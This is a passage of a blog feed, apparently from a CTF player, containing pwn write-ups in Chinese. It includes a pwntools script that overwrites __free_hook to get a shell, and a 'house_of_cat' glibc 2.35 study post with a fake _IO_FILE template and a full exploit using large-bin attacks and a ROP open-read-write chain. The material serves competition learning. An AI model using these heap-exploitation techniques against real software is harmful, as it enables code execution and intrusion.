class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./cgrasstring"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla("Your choice:",str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla("size:",str(size))</span><br><span class="line">    sla("content:",content)</span><br><span class="line"></span><br><span class="line">def change(index,size,content):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla("idx",str(index))</span><br><span class="line">    sla("size",str(size))</span><br><span class="line">    sa("content",content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla("idx",str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(0,8):</span><br><span class="line">    add(0x80,b"/bin/sh\x00")</span><br><span class="line">for i in range(1,8):</span><br><span class="line">    change(i,0x90,'\xe0')</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">ru('Now you see it:')</span><br><span class="line">libcbase=u64(io.recv(6).ljust(8,b'\x00'))-0x3ebce0</span><br><span class="line">free_hook=libcbase+libc.sym['__free_hook']</span><br><span class="line">system=libcbase+libc.sym['system']</span><br><span class="line"></span><br><span class="line">add(0x20,b'youlin')</span><br><span class="line">change(8,0x30,p64(free_hook))</span><br><span class="line">ogg=libcbase+0x4f432</span><br><span class="line">add(0x20,p64(ogg))</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;cyberprinter&quot;&gt;&lt;a href=&quot;#cyberprinter&quot; class=&quot;headerlink&quot; title=&quot;cyberprinter&quot;&gt;&lt;/a&gt;cyberprinter&lt;/h2&gt;&lt;p&gt;首先通过溢出覆盖’’\x00’，可以泄露libc.然后是一个</summary>
      
    
    
    
    <category term="cometition" scheme="http://wscyoulin.github.io/categories/cometition/"/>
    
    
  </entry>
  
  <entry>
    <title>house_of_cat</title>
    <link href="http://wscyoulin.github.io/2022/09/14/house-of-cat/"/>
    <id>http://wscyoulin.github.io/2022/09/14/house-of-cat/</id>
    <published>2022-09-14T12:09:00.000Z</published>
    <updated>2022-09-15T15:49:40.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="house-of-cat学习记录"><a href="#house-of-cat学习记录" class="headerlink" title="house_of_cat学习记录"></a>house_of_cat学习记录</h1><p>具体原理：<a href="https://bbs.pediy.com/thread-273895.htm#msg_header_h3_6">https://bbs.pediy.com/thread-273895.htm#msg_header_h3_6</a></p><h2 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h2><p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，在<strong>开启沙箱</strong>的情况下，假如把最后调用的**[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag<strong>；如果</strong>未开启沙箱<strong>，则只需把</strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串**，就可执行system(“/bin/sh”)</p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>1.修改**_IO_list_all<strong>为可控地址（</strong>FSOP<strong>）或修改</strong>stderr<strong>为可控地址(</strong>__malloc_assert**)。<br>2.在上一步的可控地址中伪造<strong>fake_IO结构体</strong>(也可以在任意地址写的情况下修改<strong>stderr、stdout</strong>等结构体)。<br>3.通过<strong>FSOP</strong>或<strong>malloc</strong>触发攻击。</p><p>catfly师傅画的图：</p><p><img src="https://bbs.pediy.com/upload/attach/202208/959842_JDJKTRK7GJUEUFR.png" alt="图片描述"></p><p><strong>模板：</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = 0</span><br><span class="line">fake_IO_FILE=p64(rdi)         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(0)*7</span><br><span class="line">fake_IO_FILE +=p64(1)+p64(0)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x68, '\x00')</span><br><span class="line">fake_IO_FILE += p64(0)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x88, '\x00')</span><br><span class="line">fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xa0, '\x00')</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xc0, '\x00')</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xd8, '\x00')</span><br><span class="line">fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(0)*6</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr</span><br></pre></td></tr></tbody></table></figure><h2 id="强网杯：house-of-cat"><a href="#强网杯：house-of-cat" class="headerlink" title="强网杯：house_of_cat"></a>强网杯：house_of_cat</h2><p>个人认为将这道题写的最清楚的一篇文章：<a href="https://blog.csdn.net/tbsqigongzi/article/details/126635738">https://blog.csdn.net/tbsqigongzi/article/details/126635738</a></p><p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1663157815912.png" alt="1663157815912"></p><p>一道GLIBC 2.35-0ubuntu3开了沙箱的题</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_1A50(char *a1, __int64 a2)</span><br><span class="line">{</span><br><span class="line">  char *s; // [rsp+18h] [rbp-28h]</span><br><span class="line">  char *v4; // [rsp+20h] [rbp-20h]</span><br><span class="line">  char *v5; // [rsp+20h] [rbp-20h]</span><br><span class="line">  char *v6; // [rsp+20h] [rbp-20h]</span><br><span class="line">  const char *s2; // [rsp+28h] [rbp-18h]</span><br><span class="line">  char *v8; // [rsp+30h] [rbp-10h]</span><br><span class="line">  const char *s1; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = strstr(a1, "QWB");</span><br><span class="line">  if ( !v4 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *v4 = 0;</span><br><span class="line">  v4[1] = 0;</span><br><span class="line">  v4[2] = 32;</span><br><span class="line">  v5 = v4 + 3;</span><br><span class="line">  s2 = strtok(a1, " ");</span><br><span class="line">  if ( !strcmp("LOGIN", s2) )</span><br><span class="line">  {</span><br><span class="line">    *(a2 + 8) = 1;</span><br><span class="line">  }</span><br><span class="line">  else if ( *(a2 + 8) || strcmp("DOG", s2) )</span><br><span class="line">  {</span><br><span class="line">    if ( *(a2 + 8) || strcmp("CAT", s2) )</span><br><span class="line">    {</span><br><span class="line">      if ( *(a2 + 8) || strcmp("MONKEY", s2) )</span><br><span class="line">      {</span><br><span class="line">        if ( *(a2 + 8) || strcmp("FISH", s2) )</span><br><span class="line">        {</span><br><span class="line">          if ( *(a2 + 8) || strcmp("PIG", s2) )</span><br><span class="line">          {</span><br><span class="line">            if ( *(a2 + 8) || strcmp("WOLF", s2) )</span><br><span class="line">            {</span><br><span class="line">              if ( *(a2 + 8) || strcmp("DUCK", s2) )</span><br><span class="line">              {</span><br><span class="line">                if ( *(a2 + 8) || strcmp("GOLF", s2) )</span><br><span class="line">                {</span><br><span class="line">                  if ( *(a2 + 8) || strcmp("TIGER", s2) )</span><br><span class="line">                    return 0LL;</span><br><span class="line">                  *(a2 + 8) = 10;</span><br><span class="line">                }</span><br><span class="line">                else</span><br><span class="line">                {</span><br><span class="line">                  *(a2 + 8) = 9;</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">              else</span><br><span class="line">              {</span><br><span class="line">                *(a2 + 8) = 8;</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">            else</span><br><span class="line">            {</span><br><span class="line">              *(a2 + 8) = 7;</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          else</span><br><span class="line">          {</span><br><span class="line">            *(a2 + 8) = 6;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        else</span><br><span class="line">        {</span><br><span class="line">          *(a2 + 8) = 5;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      else</span><br><span class="line">      {</span><br><span class="line">        *(a2 + 8) = 4;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    else</span><br><span class="line">    {</span><br><span class="line">      *(a2 + 8) = 3;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  else</span><br><span class="line">  {</span><br><span class="line">    *(a2 + 8) = 2;</span><br><span class="line">  }</span><br><span class="line">  v8 = strtok(0LL, " ");</span><br><span class="line">  if ( v8 != strchr(v8, 124) )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *a2 = v8;</span><br><span class="line">  s1 = strtok(0LL, " ");</span><br><span class="line">  if ( strcmp(s1, "r00t") )</span><br><span class="line">    return 0LL;</span><br><span class="line">  s = v5 + 5;</span><br><span class="line">  v6 = strstr(v5, "QWXF");</span><br><span class="line">  if ( !v6 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *v6 = 0;</span><br><span class="line">  v6[1] = 0;</span><br><span class="line">  v6[2] = 0;</span><br><span class="line">  v6[3] = 32;</span><br><span class="line">  *(a2 + 16) = s;</span><br><span class="line">  return 1LL;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>要想开始做堆题还得绕过上面这堆判断：LOGIN | r00t QWB QWXFadmin</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_1DF3(__int64 a1)</span><br><span class="line">{</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  char *v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( *(a1 + 8) == 1 &amp;&amp; !strcmp(*(a1 + 16), "admin") )</span><br><span class="line">    dword_4040[0] = 1;</span><br><span class="line">  result = *(a1 + 8);</span><br><span class="line">  if ( result == 3 )</span><br><span class="line">  {</span><br><span class="line">    result = strtok(*(a1 + 16), "$");</span><br><span class="line">    v3 = result;</span><br><span class="line">    if ( result )</span><br><span class="line">    {</span><br><span class="line">      result = dword_4014;</span><br><span class="line">      if ( *v3 == dword_4014 )</span><br><span class="line">      {</span><br><span class="line">        result = dword_4040[0];</span><br><span class="line">        if ( dword_4040[0] )</span><br><span class="line">        {</span><br><span class="line">          menu();</span><br><span class="line">          v2 = choice();</span><br><span class="line">          if ( v2 == 4 )</span><br><span class="line">          {</span><br><span class="line">            return sub_1916();</span><br><span class="line">          }</span><br><span class="line">          else</span><br><span class="line">          {</span><br><span class="line">            if ( v2 &lt;= 4 )</span><br><span class="line">            {</span><br><span class="line">              switch ( v2 )</span><br><span class="line">              {</span><br><span class="line">                case 3u:</span><br><span class="line">                  return edit();</span><br><span class="line">                case 1u:</span><br><span class="line">                  return add();</span><br><span class="line">                case 2u:</span><br><span class="line">                  return delete();</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">            return sub_12D9("error!\n");</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后操作堆块的时候还需要先输入：CAT | r00t QWB QWXF$\xff</p><p><img src="https://tuchuangs.com/imgs/2022/09/14/2f1bade8876828af.png"></p><p>由于题目直接存在uaf，所以可以直接通过unsorted bin泄露libc(其实直接通过largebin也可以直接泄露libc,而且还可以泄露heapbase)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process('./house_of_cat')</span><br><span class="line">#io=remote("1.14.71.254",28566)</span><br><span class="line">libc=ELF('./libc.so.6')</span><br><span class="line">context.log_level='debug'</span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: log.info(x)</span><br><span class="line">db = lambda: gdb.attach(io)</span><br><span class="line">sa('mew mew mew~~~~~~','LOGIN | r00t QWB QWXFadmin')</span><br><span class="line">def add(idx,size,cont):</span><br><span class="line">    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')</span><br><span class="line">    sla('plz input your cat choice:\n',str(1))</span><br><span class="line">    sla('plz input your cat idx:\n',str(idx))</span><br><span class="line">    sla('plz input your cat size:\n',str(size))</span><br><span class="line">    sa('plz input your content:\n',cont)</span><br><span class="line">def delete(idx):</span><br><span class="line">    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')</span><br><span class="line">    sla('plz input your cat choice:\n', str(2))</span><br><span class="line">    sla('plz input your cat idx:\n',str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')</span><br><span class="line">    sla('plz input your cat choice:\n', str(3))</span><br><span class="line">    sla('plz input your cat idx:\n',str(idx))</span><br><span class="line">def edit(idx,cont):</span><br><span class="line">    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')</span><br><span class="line">    sla('plz input your cat choice:\n', str(4))</span><br><span class="line">    sla('plz input your cat idx:\n',str(idx))</span><br><span class="line">    sa('plz input your content:\n', cont)</span><br><span class="line"></span><br><span class="line">add(0,0x420,'youlin')</span><br><span class="line">add(1,0x430,'youlin')</span><br><span class="line">add(2,0x418,'youlin')</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libcbase=u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))-0x219ce0  #直接用下面的largebin也可以泄露libc</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">add(3,0x440,'youlin')</span><br><span class="line"></span><br><span class="line">pop_rdi=libcbase+0x000000000002a3e5</span><br><span class="line">pop_rsi=libcbase+0x000000000002be51</span><br><span class="line">pop_rdx_r12=libcbase+0x000000000011f497</span><br><span class="line">ret=libcbase+0x0000000000029cd6</span><br><span class="line">pop_rax=libcbase+0x0000000000045eb0</span><br><span class="line">stderr=libcbase+libc.sym['stderr']</span><br><span class="line">setcontext=libcbase+libc.sym['setcontext']</span><br><span class="line">close=libcbase+libc.sym['close']</span><br><span class="line">read=libcbase+libc.sym['read']</span><br><span class="line">write=libcbase+libc.sym['write']</span><br><span class="line">syscallret=libcbase+0x91396</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">io.recvuntil(b"\x7f")[-6:]#可以通过这里泄露libc,这里可以接收到main_arena+0x1104处的地址</span><br><span class="line">io.recv(10)</span><br><span class="line">heapbase=u64(io.recv(6).ljust(8,b'\x00'))-0x290</span><br><span class="line">print("heapbase:"+hex(heapbase))</span><br></pre></td></tr></tbody></table></figure><p>然后就是写模板了，然后通过large bin attack修改stderr为unsorted bin的地址（unsorted bin为伪造的_IO_FILE)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">fake_io=heapbase+0xb00</span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(0)*4</span><br><span class="line">fake_IO_FILE +=p64(0)</span><br><span class="line">fake_IO_FILE +=p64(0)</span><br><span class="line">fake_IO_FILE +=p64(1)+p64(0)</span><br><span class="line">fake_IO_FILE +=p64(heapbase+0xc18-0x68)#rdx</span><br><span class="line">fake_IO_FILE +=p64(setcontext+61)#call addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')</span><br><span class="line">fake_IO_FILE += p64(0 )  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')</span><br><span class="line">fake_IO_FILE += p64(heapbase+0x200)  # _lock = writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')</span><br><span class="line">fake_IO_FILE +=p64(heapbase+0xb30) #rax1</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b'\x00')</span><br><span class="line">fake_IO_FILE += p64(0)  # _mode = 0</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b'\x00')</span><br><span class="line">fake_IO_FILE += p64(libcbase+0x2160d0)  # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(0)*6</span><br><span class="line">fake_IO_FILE += p64(heapbase+0xb30+0x10)  # rax2</span><br><span class="line">flagaddr=heapbase+0x17d0 </span><br><span class="line">payload1=fake_IO_FILE+p64(flagaddr)+p64(0)+p64(0)*5+p64(heapbase+0x2050)+p64(ret)#heapbase+0x2050为之后的orw链,flagaddr为之后写入flag.txt的地址，heap_base+0x2050为后面写入orw的地址</span><br><span class="line">delete(2)</span><br><span class="line">add(6,0x418,payload1)</span><br><span class="line">delete(6)</span><br><span class="line"></span><br><span class="line">edit(0,p64(libcbase+0x21a0d0)*2+p64(heapbase+0x290)+p64(stderr-0x20))#first large_bin_attack  设置fd和bk指针指向原来的main_arena+0x1104处，bk_nextsize指向stderr-0x20处,使stderr指向unsorted bin</span><br><span class="line">add(5,0x440,'youlin')</span><br><span class="line">add(7,0x430,'flag.txt')</span><br><span class="line">add(8,0x430,'youlin')</span><br><span class="line">orw=p64(pop_rdi)+p64(0)+p64(close)+p64(pop_rdi)+p64(flagaddr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscallret)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(flagaddr)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read)+p64(pop_rdi)+p64(1)+p64(write)</span><br><span class="line">add(9,0x430,orw)</span><br><span class="line">#dbg()</span><br><span class="line">delete(5)</span><br><span class="line">add(10,0x450,p64(0)+p64(1))</span><br><span class="line">delete(8)</span><br><span class="line">dbg()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://tuchuangs.com/imgs/2022/09/14/4b938f0d3d5ad9cc.png"></p><p>最后构造一个largebin attack topchunk size，通过修改top chunk的size去执行__mallo_assert,最终跳转到context执行orw</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># second large bin attack - topchunk's size</span><br><span class="line">edit(5,p64(libcbase+0x21a0e0)*2+p64(heapbase+0x1370)+p64(heapbase+0x28e0-0x20+3))</span><br><span class="line">#dbg()</span><br><span class="line">#trigger __malloc_assert</span><br><span class="line">sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')</span><br><span class="line">sla('plz input your cat choice:\n',str(1))</span><br><span class="line">sla('plz input your cat idx:',str(11))</span><br><span class="line">sla('plz input your cat size:',str(0x450))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;house-of-cat学习记录&quot;&gt;&lt;a href=&quot;#house-of-cat学习记录&quot; class=&quot;headerlink&quot; title=&quot;house_of_cat学习记录&quot;&gt;&lt;/a&gt;house_of_cat学习记录&lt;/h1&gt;&lt;p&gt;具体原理：&lt;a href=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>io_file利用</title>
    <link href="http://wscyoulin.github.io/2022/09/07/io-file%E5%88%A9%E7%94%A8/"/>
    <id>http://wscyoulin.github.io/2022/09/07/io-file%E5%88%A9%E7%94%A8/</id>
    <published>2022-09-07T12:32:27.000Z</published>
    <updated>2022-09-08T05:50:31.207Z</updated>
    
